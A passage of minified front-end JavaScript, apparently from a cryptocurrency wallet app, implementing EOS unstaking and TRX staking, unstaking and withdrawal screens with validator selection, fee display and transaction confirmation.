          , zK = "unstaking_wrapperForm_27WHC app_wrapperLeftBlock_3QLZp"
          , jK = "unstaking_footerBlock_3t3eG app_footerBlock_n86Kc"
          , $K = "unstaking_stepInfo_3BlqN app_stepInfo_2VLE6"
          , ZK = "unstaking_inputCurrency_1D1wR"
          , StakingEosUnstakingIndex = () => {
            var e, t, a, n;
            const r = (0,
            $.I0)()
              , l = O.createRef()
              , s = (0,
            $.v9)($c)
              , i = (0,
            j.k6)()
              , [o,c] = (0,
            O.useState)(!1)
              , [u,d] = (0,
            O.useState)("")
              , [m,p] = (0,
            O.useState)("")
              , [f,E] = (0,
            O.useState)(null)
              , {fromWallet: h, setFromWallet: g} = oG({
                ticker: "eos"
            })
              , {convertToFiat: y} = useConverter()
              , v = [...s].filter((e => "eos" === e.currency));
            (0,
            O.useEffect)(( () => {
                async function fetch() {
                    if ("eos" === (null == h ? void 0 : h.currency)) {
                        const e = await Se.Z.getApiByCurrency("eos")
                          , t = await e.getInfo(h);
                        await E(t)
                    }
                }
                fetch()
            }
            ), [h]);
            const handleChangeFromWallet = e => {
                if (e) {
                    r(updateWalletsBalanceAndTxs(e, {
                        isCascade: !0
                    }));
                    g(e)
                }
            }
            ;
            (0,
            O.useEffect)(( () => {
                o && c(!1)
            }
            ), [h]);
            const handleNext = () => {
                const {isValid: e} = l.current.validate();
                if (!e) {
                    c(!0);
                    return
                }
                const t = {
                    walletFrom: null == h ? void 0 : h.uuid,
                    unstakeCpu: u,
                    unstakeNet: m
                }
                  , a = (0,
                Ko.PD)((0,
                Ko.Wn)(u || "0"), (0,
                Ko.Wn)(m || "0")).toString()
                  , n = (0,
                Ko.FH)(y(a, h, "usd"), {
                    max: 4
                });
                n && Object.assign(t, {
                    amountInUsd: n
                });
                i.push({
                    pathname: (0,
                    M.RU)("/staking-eos/unstaking/confirm"),
                    search: objectToString(t)
                })
            }
              , _ = {
                precision: 4,
                min: "0",
                max: null == f || null === (e = f.cpu) || void 0 === e ? void 0 : e.staked
            }
              , w = {
                precision: 4,
                min: "0",
                max: null == f || null === (t = f.net) || void 0 === t ? void 0 : t.staked
            };
            function handleChangeCpuAmount(e) {
                let {target: {value: t}} = e;
                const a = (0,
                Ko.y4)(t);
                d(a)
            }
            function handleChangeNetAmount(e) {
                let {target: {value: t}} = e;
                const a = (0,
                Ko.y4)(t);
                p(a)
            }
            return O.createElement("div", {
                className: HK
            }, O.createElement(DashboardMenu, null), O.createElement(XO, null, O.createElement(panel_right_image, {
                src: mD
            }, "Attention! After unstaking, your deposit will remain frozen for 72 hours.")), O.createElement("div", {
                className: zK
            }, O.createElement(sf(), {
                ref: l
            }, O.createElement(label, null, "From"), O.createElement(lf.ValidatorField, {
                rules: zf.wallet,
                value: h
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isSelect: !0,
                    isInvalid: !t && o,
                    message: a
                }, O.createElement(Mh, {
                    withoutSubwallets: !0,
                    selectedWallet: h,
                    wallets: v,
                    onChange: handleChangeFromWallet,
                    withoutWatchOnly: !0,
                    customFilter: e => onCustomFilterWallets(e, ["eos"]),
                    stakingCurrency: "EOS"
                }))
            }
            )), O.createElement(label, null, "Withdraw from CPU deposit"), O.createElement("div", {
                className: "relative"
            }, O.createElement(lf.ValidatorField, {
                required: !m,
                value: u,
                rules: zf.amount(_)
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isInvalid: !t && o,
                    message: a
                }, O.createElement(Ea, {
                    onChange: handleChangeCpuAmount,
                    value: u,
                    placeholder: "0"
                }), O.createElement("div", {
                    className: ZK
                }, "EOS"))
            }
            ))), O.createElement(label, null, "Withdraw from NET deposit"), O.createElement("div", {
                className: "relative"
            }, O.createElement(lf.ValidatorField, {
                required: !u,
                value: m,
                rules: zf.amount(w)
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isInvalid: !t && o,
                    message: a
                }, O.createElement(Ea, {
                    onChange: handleChangeNetAmount,
                    value: m,
                    placeholder: "0"
                }), O.createElement("div", {
                    className: ZK
                }, "EOS"))
            }
            ))), f && O.createElement(misk_info, null, O.createElement(MiskInfoTitle, null, "Available CPU in EOS:"), O.createElement(MiskInfoValue, {
                onClick: () => {
                    var e;
                    return d(null == f || null === (e = f.cpu) || void 0 === e ? void 0 : e.staked)
                }
            }, (0,
            Ko.yF)(null == f || null === (a = f.cpu) || void 0 === a ? void 0 : a.staked), " EOS")), f && O.createElement(misk_info, null, O.createElement(MiskInfoTitle, null, "Available NET in EOS:"), O.createElement(MiskInfoValue, {
                onClick: () => {
                    var e;
                    return p(null == f || null === (e = f.net) || void 0 === e ? void 0 : e.staked)
                }
            }, (0,
            Ko.yF)(null == f || null === (n = f.net) || void 0 === n ? void 0 : n.staked), " EOS")), O.createElement("div", {
                className: jK
            }, O.createElement("div", {
                className: $K
            }, "Step 1 of 3"), O.createElement(Yl, {
                onClick: handleNext,
                color: "blue",
                size: "big"
            }, "Next")))))
        }
          , YK = StakingEosUnstakingIndex;
        let qK = !1;
        const StakingEosUnstakingConfirm = () => {
            const e = useLocationSearch()
              , t = (0,
            j.k6)()
              , a = (0,
            j.TH)()
              , n = (0,
            $.I0)()
              , r = (0,
            $.v9)($c)
              , l = (0,
            $.v9)(eu)
              , [s,i] = (0,
            O.useState)(!1)
              , [o,c] = (0,
            O.useState)(void 0)
              , [u,d] = (0,
            O.useState)(null)
              , {convertToFiat: m} = useConverter()
              , [p,f] = (0,
            O.useState)();
            (0,
            O.useEffect)(( () => {
                r.length && f(l(e.walletFrom) || void 0)
            }
            ), [e.walletFrom, l, r]);
            const [E] = fee_wallet(p)
              , setProcess = async e => {
                c(e);
                return new Promise((e => setTimeout(e, 200)))
            }
            ;
            (0,
            O.useEffect)(( () => {
                p && n(updateWalletsBalanceAndTxs(p, {
                    isCascade: !0
                }))
            }
            ), [n, p]);
            (0,
            O.useEffect)(( () => {
                if (u) {
                    qK = !1;
                    setProcess(void 0);
                    i(!1)
                }
            }
            ), [u]);
            (0,
            O.useEffect)(( () => {
                o && !s && i(!0);
                if (!o) {
                    qK = !1;
                    i(!1)
                }
            }
            ), [s, o]);
            const handleUpdateBalance = e => async () => {
                if (e) {
                    setProcess("Updating wallet balance...");
                    await n(updateWalletsBalanceAndTxs(e, {
                        isCascade: !0
                    }));
                    setProcess(void 0)
                }
            }
              , handleBack = () => {
                t.replace({
                    pathname: (0,
                    M.RU)("/staking-eos/unstaking"),
                    search: a.search
                })
            }
            ;
            if (!p || !E)
                return null;
            const h = p.hw || E.hw
              , g = (0,
            Ko.gt)(e.amount, p.balance)
              , y = m(e.unstakeNet, p)
              , v = m(e.unstakeCpu, p)
              , _ = (0,
            Ko.PD)(e.unstakeCpu || "0", e.unstakeNet || "0").toString()
              , w = m(_, p)
              , handleConfirm = async () => {
                if (qK)
                    return;
                const a = cc.$.txPerformanceStart();
                qK = !0;
                d(null);
                await setProcess("Updating wallet balance...");
                await n(updateWalletsBalanceAndTxs(p, {
                    isCascade: !0
                }));
                await setProcess(`Loading ${(0,
                be.xG)(p.currency)} Blockchain adapter...`);
                await setProcess("Preparing transaction...");
                const r = await Se.Z.getApiByWallet(p)
                  , l = {
                    addressTo: p.address,
                    amount: `${e.unstakeCpu}(cpu) + ${e.unstakeNet}(net) = ${_}`,
                    amountInUsd: e.amountInUsd,
                    currency: "eos"
                };
                try {
                    const n = await r.unstakeBandwidthResourses({
                        accountFrom: p.accountName,
                        addressFrom: p.address,
                        accountTo: p.accountName,
                        addressTo: p.address,
                        privateKey: p.privateKey,
                        amountForNet: e.unstakeNet,
                        amountForCPU: e.unstakeCpu
                    });
                    if (n.error) {
                        d(n.error);
                        ge.b.error(ge.d.FAILED_UNSTAKE, {
                            currency: p.currency
                        }, n.error, l);
                        return
                    }
                    if (n.hash) {
                        cc.$.send(cc.d.UNSTAKING_SEND, "eos");
                        const e = cc.$.txPerformanceEnd(a);
                        cc.$.send(cc.d.PERFORMANCE_TX_UNSTAKE, p.currency, `${e} ms`);
                        ge.b.success(ge.d.UNSTAKE_SUCCESS, {
                            currency: p.currency
                        }, "false", l);
                        t.replace({
                            pathname: (0,
                            M.RU)("/send/success"),
                            search: objectToString({
                                type: "eosUnstakingTx",
                                amount: _,
                                hash: n.hash,
                                walletFrom: p.uuid,
                                currency: p.currency
                            })
                        })
                    }
                } catch (e) {
                    d(e.message);
                    ge.b.error(ge.d.FAILED_UNSTAKE, {
                        currency: p.currency
                    }, e, l)
                }
            }
            ;
            return O.createElement("div", {
                className: sM
            }, O.createElement(DashboardMenu, null), O.createElement(XO, null, O.createElement(panel_right_image, {
                src: rM
            }, "Please check details and confirm")), O.createElement("div", {
                className: iM
            }, O.createElement("div", {
                className: uM
            }, O.createElement("h3", null, "Are you sure you want to"), O.createElement("h2", null, "Unstake ", _, " ", O.createElement("span", {
                className: "nowrap"
            }, (0,
            be.xG)(p.currency)), "?")), !!e.unstakeCpu && O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "You withdraw from CPU deposit", O.createElement(ConfirmInfoSubTitle, null, "Equivalent")), O.createElement(ConfirmInfoValue, null, (0,
            Ko.yF)(e.unstakeCpu), " ", O.createElement("span", {
                className: "nowrap"
            }, (0,
            be.xG)(p.currency)), O.createElement(ConfirmInfoSubValue, null, O.createElement(fiat_estimate_FiatEstimate, {
                value: v,
                renderCurrency: !0
            })))), !!e.unstakeNet && O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "You withdraw from NET deposit", O.createElement(ConfirmInfoSubTitle, null, "Equivalent")), O.createElement(ConfirmInfoValue, null, (0,
            Ko.yF)(e.unstakeNet), " ", O.createElement("span", {
                className: "nowrap"
            }, (0,
            be.xG)(p.currency)), O.createElement(ConfirmInfoSubValue, null, O.createElement(fiat_estimate_FiatEstimate, {
                value: y,
                renderCurrency: !0
            })))), p && e.walletFrom && O.createElement(ConfirmInfoWallet, {
                type: "to",
                wallet: p
            }), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "You receive", O.createElement(ConfirmInfoSubTitle, null, "Equivalent")), O.createElement(ConfirmInfoValue, null, (0,
            Ko.yF)(_), " ", O.createElement("span", {
                className: "nowrap"
            }, (0,
            be.xG)(p.currency)), O.createElement(ConfirmInfoSubValue, null, O.createElement(fiat_estimate_FiatEstimate, {
                value: w,
                renderCurrency: !0
            })))), O.createElement("div", {
                className: dM
            }), g && O.createElement(ui_message, {
                type: "error"
            }, "Insufficient ", (0,
            be.xG)(p.currency), " Balance. Available balance: ", p.balance, " ", (0,
            be.xG)(p.currency), O.createElement("br", null), O.createElement("a", {
                className: vM,
                onClick: handleUpdateBalance(p)
            }, "Update wallet balance")), O.createElement(ledger_token_info, {
                parentWallet: E
            }), s && h && O.createElement(ui_message, null, "Please unlock you ", p.hw, ", choose ", (0,
            be.xG)(p.family), " app and then press Confirm."), u && O.createElement(bf, {
                error: u
            }), O.createElement("div", {
                className: fM
            }, s && O.createElement("div", {
                className: yM
            }, o && O.createElement("span", null, o)), !s && O.createElement("div", {
                className: EM
            }, "Step 2 of 3"), O.createElement("div", {
                className: hM
            }, !s && O.createElement("span", {
                onClick: handleBack
            }, "Back"), O.createElement(Yl, {
                color: "blue",
                size: "big",
                onClick: handleConfirm,
                isLoading: s
            }, "Confirm")))))
        }
          , XK = StakingEosUnstakingConfirm
          , QK = (0,
        te.createAction)("@trx/validators/SET_VALIDATORS")()
          , JK = "@trx/validators"
          , eH = {
            validators: []
        }
          , tH = (0,
        te.createReducer)(eH).handleAction(QK, ( (e, t) => {
            let {payload: {validators: a}} = t;
            return {
                ...e,
                validators: a
            }
        }
        )).handleAction(ne, (e => ({
            ...e,
            validators: []
        })))
          , validators_trx_selectedValidators = e => e["@trx/validators"].validators || []
          , validators_trx_fetchValidators = () => async (e, t) => {
            const a = t();
            if (validators_trx_selectedValidators(a).length)
                return;
            const n = await Se.Z.loadLightAdapterByWallet({
                currency: "trx",
                family: "trx"
            });
            n && e(QK({
                validators: await n.fetchValidators()
            }))
        }
          , aH = "TVGAM39FrwMFcyCZ4aZEE46CvEd9Adgbeo"
          , use_trx_validators_startFetchValidators = async e => {
            let {setLoading: t, dispatch: a} = e;
            t(!0);
            await a(validators_trx_fetchValidators());
            t(!1)
        }
          , useTrxValidators = () => {
            const e = (0,
            $.I0)()
              , t = (0,
            $.v9)(validators_trx_selectedValidators)
              , a = (0,
            $.v9)(Bo)
              , [n,r] = (0,
            O.useState)(!1)
              , l = (0,
            O.useMemo)(( () => {
                const e = t.find((e => e.address === aH));
                return e || (t.length > 0 ? t[0] : void 0)
            }
            ), [t]);
            (0,
            O.useEffect)(( () => {
                !0 !== a && (t.length || use_trx_validators_startFetchValidators({
                    setLoading: r,
                    dispatch: e
                }))
            }
            ), [e, t.length, a]);
            return {
                listOfRepresentatives: t,
                defaultRepresentative: l,
                isLoading: n
            }
        }
          , nH = useTrxValidators
          , rH = [{
            id: "bandwidth",
            title: "Bandwidth"
        }, {
            id: "energy",
            title: "Energy"
        }]
          , lH = [{
            id: "1",
            title: "1.0"
        }, {
            id: "2",
            title: "2.0"
        }]
          , loadStakingCourses = async e => {
            let {fromWallet: t} = e;
            const a = await Se.Z.getApiByWallet(t)
              , n = await a.getResources({
                address: t.address
            });
            return {
                energy: "NaN" === n.energyByFreezingTrx ? 0 : n.energyByFreezingTrx,
                bandwidth: "NaN" === n.bandwidthByFreezingTrx ? 0 : n.bandwidthByFreezingTrx,
                isInactive: "NaN" === n.energyByFreezingTrx && "NaN" === n.bandwidthByFreezingTrx
            }
        }
          , sH = {
            wrapper: "trx-stake_wrapper_cQVKq app_wrapperBlock_2EpA3",
            wrapperForm: "trx-stake_wrapperForm_BnrI4 app_wrapperLeftBlock_3QLZp",
            footerBlock: "trx-stake_footerBlock_2erAS app_footerBlock_n86Kc",
            stepInfo: "trx-stake_stepInfo_2NYgj app_stepInfo_2VLE6",
            toggleAdvancedOptions: "trx-stake_toggleAdvancedOptions_wYCW1",
            resourcesSelector: "trx-stake_resourcesSelector_O9Emf",
            selectorsArrow: "trx-stake_selectorsArrow_fys3q",
            selectorWrapper: "trx-stake_selectorWrapper_1kyk3",
            valueWrapper: "trx-stake_valueWrapper_2lBuM"
        }
          , StakingTrx = () => {
            const e = (0,
            $.I0)()
              , t = O.createRef()
              , a = (0,
            $.v9)($c)
              , n = (0,
            j.k6)()
              , [r,l] = (0,
            O.useState)(!1)
              , [s,i] = (0,
            O.useState)(!1)
              , [o,c] = (0,
            O.useState)()
              , [u,d] = (0,
            O.useState)(rH[0])
              , [m,p] = (0,
            O.useState)()
              , [f,E] = (0,
            O.useState)(!1)
              , {fromWallet: h, setFromWallet: g, validatorAddress: y, amount: v, setAmount: _} = oG({
                ticker: "trx"
            })
              , {convertToFiat: w} = useConverter()
              , {listOfRepresentatives: b, defaultRepresentative: k, isLoading: S} = nH()
              , C = (0,
            O.useMemo)(( () => parseInt((0,
            Ko.$q)(m && u.id ? m[u.id] : 0, v || 0).toString())), [m, v, u])
              , N = [...a].filter((e => "trx" === e.currency))
              , T = 0
              , A = (0,
            Ko.FH)(h ? h.balance : "0", {
                roundDown: !0,
                max: 0
            });
            (0,
            O.useEffect)(( () => {
                if (y) {
                    const e = b.find((e => e.address === y));
                    e && c(e)
                }
            }
            ), [y, b]);
            (0,
            O.useEffect)(( () => {
                !o && k && c(k)
            }
            ), [o, k]);
            const handleChangeFromWallet = t => {
                e(updateWalletsBalanceAndTxs(t, {
                    isCascade: !1
                }));
                const a = new URLSearchParams({
                    walletFrom: t.uuid
                });
                n.replace({
                    search: a.toString()
                });
                g(t)
            }
              , handleSetVisibleOptions = () => {
                l(!r)
            }
              , handleSetValidator = e => {
                c(e)
            }
              , handleResource = e => {
                d(e)
            }
            ;
            (0,
            O.useEffect)(( () => {
                l(!1);
                k && c(k);
                s && i(!1)
            }
            ), [null == h ? void 0 : h.uuid]);
            (0,
            O.useEffect)(( () => {
                h && async function() {
                    const {isInactive: e, energy: t, bandwidth: a} = await loadStakingCourses({
                        fromWallet: h
                    });
                    E(e);
                    p({
                        energy: t,
                        bandwidth: a
                    })
                }()
            }
            ), [h, null == h ? void 0 : h.uuid]);
            const handleNext = async () => {
                var e;
                const {isValid: a} = null == t || null === (e = t.current) || void 0 === e ? void 0 : e.validate();
                if (!a || !o || !h) {
                    i(!0);
                    return
                }
                const r = {
                    validatorAddress: (null == o ? void 0 : o.address) || "",
                    validatorTitle: (null == o ? void 0 : o.title) || "",
                    validatorRate: (null == o ? void 0 : o.rate.toString()) || "",
                    walletFrom: (null == h ? void 0 : h.uuid) || "",
                    amount: v
                };
                m && u.id && Object.assign(r, {
                    resource: u.id,
                    resourceAmount: parseInt((0,
                    Ko.$q)(m[u.id] || 0, v || 0).toString())
                });
                const l = (0,
                Ko.FH)(w(v, h, "usd"), {
                    max: 4
                });
                l && Object.assign(r, {
                    amountInUsd: l
                });
                const s = new URLSearchParams(r);
                n.push({
                    pathname: (0,
                    M.RU)("/staking-trx/confirm"),
                    search: s.toString()
                })
            }
              , x = {
                precision: 0,
                min: "0",
                max: A,
                available: A
            };
            function handleChangeAmount(e) {
                let {target: {value: t}} = e;
                const a = (0,
                Ko.y4)(t);
                _(a)
            }
            return h ? O.createElement(sG, {
                wallet: h,
                styles: sH
            }, O.createElement(sf(), {
                ref: t
            }, O.createElement(label, null, "From"), O.createElement(lf.ValidatorField, {
                rules: zf.wallet,
                value: h
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isSelect: !0,
                    isInvalid: !t && s,
                    message: a
                }, O.createElement(Mh, {
                    selectedWallet: h,
                    wallets: N,
                    onChange: handleChangeFromWallet,
                    withoutWatchOnly: !0,
                    withoutSubwallets: !0,
                    customFilter: e => onCustomFilterWallets(e, ["trx"]),
                    stakingCurrency: "TRX"
                }))
            }
            )), O.createElement(label, null, "Deposit Amount"), O.createElement("div", {
                className: sH.blocked
            }, O.createElement(lf.ValidatorField, {
                value: v,
                rules: [...zf.trxMinimumAmount(x), ...zf.amount(x)]
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isInvalid: !t && s,
                    message: a
                }, O.createElement(Ea, {
                    autoFocus: !0,
                    name: "lastpass-fix-search",
                    onChange: handleChangeAmount,
                    value: v,
                    placeholder: "0"
                }))
            }
            ))), o && O.createElement(misk_info, null, O.createElement(MiskInfoTitle, null, "Super Representative:"), O.createElement(MiskInfoValue, null, null == o ? void 0 : o.title, " (", null == o ? void 0 : o.subtitle, ")")), !o && O.createElement(misk_info, null, O.createElement(MiskInfoTitle, null, "Super Representative:"), O.createElement(MiskInfoValue, null, O.createElement(LoaderDots, {
                visible: !0
            }))), O.createElement(misk_info, null, O.createElement(MiskInfoTitle, null, "You will get:"), O.createElement(MiskInfoValue, {
                className: sH.valueWrapper
            }, Number.isNaN(C) || 0 === C ? "-" : C), O.createElement(MiskInfoValue, {
                className: sH.selectorWrapper
            }, O.createElement(Lp, {
                emptyPlaceholder: "",
                placeholder: "",
                inputWrapperClassName: sH.resourcesSelector,
                arrowClassName: sH.selectorsArrow,
                selected: u,
                hasSearch: !1,
                items: rH,
                onChange: handleResource
            }))), f && O.createElement(ui_message, {
                type: "error"
            }, "You should activate your TRON address by sending TRX to it."), !r && O.createElement("div", {
                className: sH.toggleAdvancedOptions
            }, O.createElement("span", {
                onClick: handleSetVisibleOptions,
                className: "dashedNormal"
            }, "Advanced options")), r && O.createElement(O.Fragment, null, O.createElement("div", {
                className: sH.toggleAdvancedOptions
            }, O.createElement("span", {
                onClick: handleSetVisibleOptions,
                className: "dashedNormal"
            }, "Hide advanced options")), O.createElement(label, null, "To"), O.createElement(lf.ValidatorField, {
                rules: zf.trxValidator,
                value: o
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isSelect: !0,
                    isInvalid: !t && s,
                    message: a
                }, O.createElement(Lp, {
                    selected: o,
                    isLoading: S,
                    items: b,
                    placeholder: "Select Validator",
                    emptyPlaceholder: "Validators not found",
                    onChange: handleSetValidator
                }))
            }
            )), O.createElement(ui_message, {
                type: "warning"
            }, "We cannot guarantee the stability of a third-party validator. Please do your own research to assess risks.")), O.createElement("div", {
                className: sH.footerBlock
            }, O.createElement("div", {
                className: sH.stepInfo
            }, "Step 1 of 3"), O.createElement(Yl, {
                onClick: handleNext,
                color: "blue",
                size: "big"
            }, "Next")))) : null
        }
          , iH = StakingTrx
          , oH = "staking-trx_buttonsWrapper_2syPJ"
          , capitalize = e => e && e[0].toUpperCase() + e.slice(1)
          , cH = "Your funds will be refunded in 14 days.";
        function TrxUnstakeConfirm() {
            const {amount: e, walletFrom: t, stakingVersion: a="", resource: n=""} = useLocationSearch()
              , r = (0,
            j.k6)()
              , l = (0,
            $.I0)()
              , s = (0,
            $.v9)(nx)
              , i = (0,
            $.v9)(rx)
              , o = (0,
            $.v9)(sx)
              , c = (0,
            $.v9)(ix)
              , u = (0,
            O.useMemo)(( () => Boolean(s || c)), [s, c])
              , {fromWallet: d, toWallet: m, feeWallet: p} = useWalletsForStakingTx({
                walletIdFromParams: t
            })
              , [f,E,h,g,,y] = use_fee(d, m, e)
              , {hardWalletType: v, isHardWallet: _, isInsufficientBalance: w} = useBooleanRules({
                fee: f,
                feeWallet: p,
                fromWallet: d,
                amount: e,
                feeResource: y
            })
              , {effectiveFee: b, effectivePrivateKey: k} = useEffectiveValue({
                fromWalletCurrency: (null == d ? void 0 : d.currency) || "",
                validatorRate: "",
                validatorTitle: "",
                fee: f,
                fromWalletPrivateKey: (null == d ? void 0 : d.privateKey) || ""
            })
              , {formattedFeeCurrency: S, formattedCurrency: C, formattedAmount: N, formattedFamily: T} = useFormattedValue({
                feeWallet: p,
                fromWallet: d,
                amount: e
            })
              , {equivalentAmount: A, equivalentAmountUsd: x} = useEquivalentValue({
                amount: e,
                fromWallet: d
            })
              , I = (0,
            O.useCallback)((async e => {
                await executeCallbackAndSetTimeout({
                    callback: () => l(lb.setProcessCommit({
                        processText: e
                    }))
                })
            }
            ), [l])
              , handleConfirm = () => {
                u || w || h || !d || l(lb.unstakeConfirm({
                    uuid: d.uuid,
                    wallet: {
                        currency: d.currency,
                        balance: d.balance,
                        privateKey: k,
                        address: d.address,
                        rewardAddress: d.rewardAddress
                    },
                    stakingVersion: Number.parseInt(a, 10),
                    resource: n,
                    fee: b,
                    validatorAddress: "",
                    amount: e || ""
                }))
            }
            ;
            (0,
            O.useEffect)((function showLoadingTextOfLoadingFee() {
                l(h ? lb.setLoadingStart({
                    processText: "Loading Fee..."
                }) : lb.setLoadingStop())
            }
            ), [l, h, I]);
            (0,
            O.useLayoutEffect)((function goToNextStepIfHaveTransactionHash() {
                if ("string" == typeof c) {
                    const t = new URLSearchParams({
                        type: `${null == d ? void 0 : d.currency}UnstakeTx`,
                        amount: e || "",
                        hash: c,
                        walletFrom: (null == d ? void 0 : d.uuid) || "",
                        currency: (null == d ? void 0 : d.currency) || ""
                    });
                    r.replace({
                        pathname: (0,
                        M.RU)("/send/success"),
                        search: t.toString()
                    })
                }
            }
            ), [e, null == d ? void 0 : d.currency, null == d ? void 0 : d.uuid, r, c]);
            (0,
            O.useEffect)((function clearStore() {
                return () => {
                    l(lb.setClearStore())
                }
            }
            ), []);
            return d && p ? O.createElement("div", {
                className: QG
            }, O.createElement(DashboardMenu, null), O.createElement(XO, null, O.createElement(panel_right_image, {
                src: rM
            }, cH)), O.createElement("div", {
                className: JG
            }, O.createElement("div", {
                className: aV
            }, O.createElement("h3", null, "Are you sure you want to"), O.createElement("h2", null, "Unstake ", N, " ", O.createElement("span", {
                className: "nowrap"
            }, C), "?")), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "You will receive", O.createElement(ConfirmInfoSubTitle, null, "Equivalent")), O.createElement(ConfirmInfoValue, null, N, " ", O.createElement("span", {
                className: "nowrap"
            }, C), O.createElement(ConfirmInfoSubValue, null, O.createElement(fiat_estimate_FiatEstimate, {
                value: A,
                renderCurrency: !0
            })))), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "Resource"), O.createElement(ConfirmInfoValue, null, capitalize(n))), O.createElement(ConfirmInfoWallet, {
                type: "to",
                wallet: d
            }), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "Estimated Network Fee", O.createElement(ConfirmInfoSubTitle, null, "Equivalent")), O.createElement(ConfirmInfoValue, null, O.createElement(FeeBlock, {
                resource: y,
                fee: f,
                isLoadingFee: h,
                feeWallet: p,
                formattedFeeCurrency: y && (0,
                be.iX)(y) || S
            }))), O.createElement("div", {
                className: nV
            }), O.createElement(ledger_token_info, {
                parentWallet: p
            }), O.createElement(HardWalletMessage, {
                isVisible: u && _,
                hardWalletType: v || "",
                formattedFamily: T
            }), O.createElement(FailedLoadFeeError_FailedLoadFeeError, {
                isVisible: E,
                handleRetryFee: g
            }), O.createElement(InsufficientBalanceError_InsufficientBalanceError_InsufficientBalanceError, {
                isVisible: w,
                formattedFeeCurrency: S,
                fee: f,
                fromWallet: d,
                isFeeWalletOng: !1,
                feeWalletBalance: p.balance
            }), o && O.createElement(bf, {
                error: o
            }), O.createElement("div", {
                className: sV
            }, u && O.createElement("div", {
                className: uV
            }, i && O.createElement("span", null, i)), !u && O.createElement("div", {
                className: iV
            }, "Step 2 of 3"), O.createElement("div", {
                className: oH
            }, !u && O.createElement(Y.OL, {
                to: (0,
                M.RU)(`/staking-trx/unstaking/?walletFrom=${(null == d ? void 0 : d.uuid) || ""}`)
            }, "Back"), O.createElement(CloseOrConfirmButton, {
                showConfirmButton: !w,
                isLoading: u,
                onClick: handleConfirm,
                walletUuid: d.uuid
            })))), O.createElement("input", {
                id: `${d.currency}UnstakeAmountInUsd`,
                type: "hidden",
                name: "amountInUsd",
                value: x
            })) : O.createElement(O.Fragment, null)
        }
        function TrxWithdrawConfirm() {
            const e = (0,
            j.k6)()
              , [t,a] = (0,
            O.useState)()
              , [n,r] = (0,
            O.useState)(!1)
              , [l,s] = (0,
            O.useState)("")
              , {amount: i, walletFrom: o} = useLocationSearch()
              , {fromWallet: c, toWallet: u, feeWallet: d} = useWalletsForStakingTx({
                walletIdFromParams: o
            })
              , [m,p,f,E,,h] = use_fee(c, u, i)
              , {formattedFeeCurrency: g, formattedAmount: y, formattedCurrency: v} = useFormattedValue({
                feeWallet: d,
                fromWallet: c,
                amount: i
            })
              , {equivalentAmount: _} = useEquivalentValue({
                amount: i,
                fromWallet: c
            })
              , {isInsufficientBalance: w} = useBooleanRules({
                fee: m,
                feeWallet: d,
                fromWallet: c,
                amount: i,
                feeResource: h
            })
              , handleConfirm = async () => {
                if (!c)
                    return;
                r(!0);
                s("Sending transaction...");
                const t = await Se.Z.getApiByWallet(c);
                try {
                    const n = await t.withdraw({
                        address: c.address,
                        wallet: c
                    });
                    s("");
                    r(!1);
                    if (n.error) {
                        a(n.error);
                        return
                    }
                    if (n.hash) {
                        const t = new URLSearchParams({
                            type: "trxWithdrawTx",
                            amount: i || "",
                            hash: n.hash,
                            walletFrom: c.uuid,
                            currency: c.currency
                        });
                        e.replace({
                            pathname: (0,
                            M.RU)("/send/success"),
                            search: t.toString()
                        })
                    }
                } catch (e) {
                    r(!1)
                }
            }
            ;
            return c && d ? O.createElement("div", {
                className: QG
            }, O.createElement(DashboardMenu, null), O.createElement(XO, null, O.createElement(panel_right_image, {
                src: rM
            }, "bebra")), O.createElement("div", {
                className: JG
            }, O.createElement("div", {
                className: aV
            }, O.createElement("h3", null, "Are you sure you want to"), O.createElement("h2", null, "Withdraw ", i, " ", O.createElement("span", {
                className: "nowrap"
            }, "TRX"), "?")), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "You will receive", O.createElement(ConfirmInfoSubTitle, null, "Equivalent")), O.createElement(ConfirmInfoValue, null, y, " ", O.createElement("span", {
                className: "nowrap"
            }, v), O.createElement(ConfirmInfoSubValue, null, O.createElement(fiat_estimate_FiatEstimate, {
                value: _,
                renderCurrency: !0
            })))), O.createElement(ConfirmInfoWallet, {
                type: "to",
                wallet: c
            }), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "Network Fee", O.createElement(ConfirmInfoSubTitle, null, "Equivalent")), O.createElement(ConfirmInfoValue, null, O.createElement(FeeBlock, {
                resource: h,
                fee: m,
                isLoadingFee: f,
                feeWallet: d,
                formattedFeeCurrency: h && (0,
                be.iX)(h) || g
            }))), O.createElement("div", {
                className: nV
            }), O.createElement(FailedLoadFeeError_FailedLoadFeeError, {
                isVisible: p,
                handleRetryFee: E
            }), O.createElement(InsufficientBalanceError_InsufficientBalanceError_InsufficientBalanceError, {
                isVisible: w,
                formattedFeeCurrency: g,
                fee: m,
                fromWallet: c,
                isFeeWalletOng: !1,
                feeWalletBalance: null == d ? void 0 : d.balance
            }), t && O.createElement(bf, {
                error: t
            }), O.createElement("div", {
                className: sV
            }, n && O.createElement("div", {
                className: uV
            }, l && O.createElement("span", null, l)), !n && O.createElement("div", {
                className: iV
            }, "Step 2 of 3"), O.createElement("div", {
                className: oV
            }, w ? O.createElement(Y.OL, {
                to: `${(0,
                M.RU)()}/receive`
            }, O.createElement(Yl, {
                color: "blue"
            }, "Close")) : O.createElement(Yl, {
                color: "blue",
                onClick: handleConfirm,
                isLoading: n
            }, "Confirm"))))) : O.createElement(O.Fragment, null)
        }
        const uH = {
            wrapper: "trx-unstake_wrapper_2Jh93 app_wrapperBlock_2EpA3",
            wrapperForm: "trx-unstake_wrapperForm_1J5h_ app_wrapperLeftBlock_3QLZp",
            footerBlock: "trx-unstake_footerBlock_1IgXW app_footerBlock_n86Kc",
            stepInfo: "trx-unstake_stepInfo_32HYE app_stepInfo_2VLE6",
